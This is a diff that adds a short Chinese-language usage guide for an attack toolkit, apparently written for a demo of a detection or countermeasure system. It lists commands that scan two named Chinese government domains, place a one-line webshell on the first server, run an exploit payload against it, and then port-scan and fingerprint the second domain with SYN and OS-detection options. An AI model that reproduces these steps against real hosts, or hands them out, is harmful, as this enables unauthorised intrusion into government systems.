@@ -1,0 +1,19 @@
+使用指南:
+
+1. 在hacker端，启动bin/bserver
+
+2. 开始扫描
+    2.1 先扫描A网站: shs/scan -t liangshan.gov.cn 
+    2.2 上传并利用A网站漏洞：
+        1) 在A网站服务端准备好一句话木马(shs/nclient.sh);
+        2) shs/mypayload -target liangshan.gov.cn -port 80 -expliot expliots/xxxx
+            (用之前把mypayload中的接口路径改成正确的)；
+        3) 一旦接口感应到扫描，睡眠1ms后，启动木马;
+
+    2.3 扫描B网站(扫描之前将调用后台的接口加入歌脚本)
+        1) shs/scan -t xinyu.gov.cn
+        2) shs/xmap xinyu.gov.cn -O
+        3) shs/xmap xinyu.gov.cn -syn
+        4) shs/xmap xinyu.gov.cn -n 20
+        5) shs/dmimap xinyu.gov.cn -n 100
+        6) 演示系统启动反制措施并通知路由器等
